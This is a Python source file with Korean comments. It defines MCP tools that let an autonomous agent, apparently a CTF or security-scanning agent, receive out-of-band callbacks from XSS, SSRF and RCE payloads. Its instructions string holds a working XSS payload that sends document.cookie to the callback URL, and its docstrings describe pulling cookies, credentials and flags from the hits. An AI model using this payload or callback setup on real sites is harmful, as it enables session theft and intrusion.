"""OOB (Out-of-band) callback 도구 — XSS bot / SSRF / RCE 결과 수신용 일반 능력.

공격 페이로드가 외부 webhook URL로 데이터를 보낼 때, 그 webhook을 우리 backend로 지정.
backend의 `/oob/<token>/...` view가 모든 method/headers/query/body 저장.

자율성 원칙 — 호출 시점은 에이전트 결정. 사용 흐름:
  1) `oob_register_token(scan_run_id)` 호출 → 고유 token + URL 받음
  2) 페이로드에 그 URL을 콜백으로 박음 (예: XSS payload의 fetch/location.replace 대상)
  3) 공격 시도 → admin bot이 우리 URL hit → DB에 hit 저장
  4) `oob_get_hits(token, since)` 폴링 → cookie/token/flag 추출
"""
from __future__ import annotations

import json
import os
import secrets
import time

from asgiref.sync import sync_to_async


# OOB receiver의 외부 URL — bot 컨테이너에서 도달 가능한 hostname:port 사용.
# 같은 docker network라면 backend service hostname (예: "backend" 또는 "watchdog-backend") 권장.
def _oob_base_url() -> str:
    base = os.environ.get("OOB_PUBLIC_BASE", "").strip()
    if base:
        return base.rstrip("/")
    # default — backend가 같은 docker network에 있다고 가정.
    # docker compose service 이름이 가장 안정적인 hostname (예: "backend").
    host = os.environ.get("OOB_HOST", "backend")
    port = os.environ.get("OOB_PORT", "8000")
    return f"http://{host}:{port}"


def _register_token(scan_run_id: str) -> dict:
    """랜덤 token 생성 + URL 반환. DB에 별도 저장은 안 함 (hit가 들어와야만 OOBHit 생성)."""
    token = f"{(scan_run_id or 'scan')[:8]}-{secrets.token_hex(8)}"
    base = _oob_base_url()
    return {
        "token": token,
        "callback_url": f"{base}/oob/{token}/",
        "instructions": (
            "이 callback_url을 페이로드의 webhook 대상으로 사용. "
            "예: <img src=x onerror=\"fetch('"
            f"{base}/oob/{token}/'+document.cookie)\">. "
            "공격 후 oob_get_hits(token=...) 로 hit 폴링."
        ),
    }


def _get_hits(token: str, since_iso: str, limit: int) -> dict:
    from api.models import OOBHit
    from django.utils.dateparse import parse_datetime

    qs = OOBHit.objects.filter(token=token).order_by("-received_at")
    if since_iso:
        dt = parse_datetime(since_iso)
        if dt is not None:
            qs = qs.filter(received_at__gt=dt)
    qs = qs[:max(1, min(int(limit) if limit else 50, 200))]
    items = []
    for h in qs:
        items.append({
            "hit_id": str(h.hit_id),
            "method": h.method,
            "path": h.path,
            "query_string": h.query_string,
            "body": (h.body or "")[:4000],
            "headers": h.headers,
            "remote_addr": h.remote_addr,
            "received_at": h.received_at.isoformat(),
        })
    return {"token": token, "count": len(items), "hits": items}


def _clear_hits(token: str) -> dict:
    from api.models import OOBHit

    deleted, _ = OOBHit.objects.filter(token=token).delete()
    return {"token": token, "deleted": deleted}


def register(mcp):

    @mcp.tool()
    def oob_register_token(scan_run_id: str = "") -> str:
        """OOB callback URL 발급. 페이로드의 외부 webhook 대상으로 사용.

        반환: {token, callback_url, instructions}
        callback_url 예: http://watchdog-backend:8000/oob/<token>/

        같은 docker network의 admin bot 등이 이 URL을 hit하면 OOBHit으로 자동 저장.
        XSS-to-cookie, SSRF-to-callback, RCE-OOB 등 모든 비동기 공격에 사용.
        """
        return json.dumps(_register_token(scan_run_id), ensure_ascii=False)

    @mcp.tool()
    async def oob_get_hits(token: str, since_iso: str = "", limit: int = 50) -> str:
        """token으로 들어온 OOB hits 조회.

        Args:
            token: oob_register_token 발급한 token
            since_iso: ISO datetime — 그 이후 hit만 (점진 폴링용). 비우면 전체.
            limit: 최대 반환 갯수 (default 50, max 200)

        반환된 hits[*].path/query_string/body/headers 에서 cookie/flag/credential 추출.
        예: query에 'FLAG=codegate2023{...}' 또는 body에 'document.cookie' 포함 가능.
        """
        try:
            result = await sync_to_async(_get_hits, thread_sensitive=True)(
                token=token, since_iso=since_iso or "", limit=int(limit) if limit else 50,
            )
            return json.dumps(result, ensure_ascii=False, default=str)
        except Exception as e:
            return json.dumps({"error": f"oob_get_hits failed: {e}"})

    @mcp.tool()
    async def oob_clear_hits(token: str) -> str:
        """해당 token의 모든 hit 삭제 (재시도/clean 용)."""
        try:
            result = await sync_to_async(_clear_hits, thread_sensitive=True)(token=token)
            return json.dumps(result, ensure_ascii=False)
        except Exception as e:
            return json.dumps({"error": f"oob_clear_hits failed: {e}"})

    @mcp.tool()
    async def oob_wait_for_hit(
        token: str, timeout_s: int = 30, poll_interval_s: int = 2
    ) -> str:
        """해당 token에 hit이 들어올 때까지 대기 (admin bot 자동 트리거 후).

        Args:
            token: 폴링할 token
            timeout_s: 최대 대기 (default 30s)
            poll_interval_s: 폴링 주기 (default 2s)

        첫 hit 발견 즉시 반환. timeout이면 hits=[] 빈 결과.
        XSS bot trigger 등 비동기 공격에서 결과 동기 수신용.
        """
        deadline = time.time() + max(1, min(int(timeout_s), 120))
        last = None
        while time.time() < deadline:
            try:
                last = await sync_to_async(_get_hits, thread_sensitive=True)(
                    token=token, since_iso="", limit=10,
                )
                if last.get("count", 0) > 0:
                    return json.dumps(
                        {"timed_out": False, **last}, ensure_ascii=False, default=str
                    )
            except Exception:
                pass
            time.sleep(max(1, int(poll_interval_s)))
        return json.dumps(
            {"timed_out": True, **(last or {"token": token, "count": 0, "hits": []})},
            ensure_ascii=False, default=str,
        )
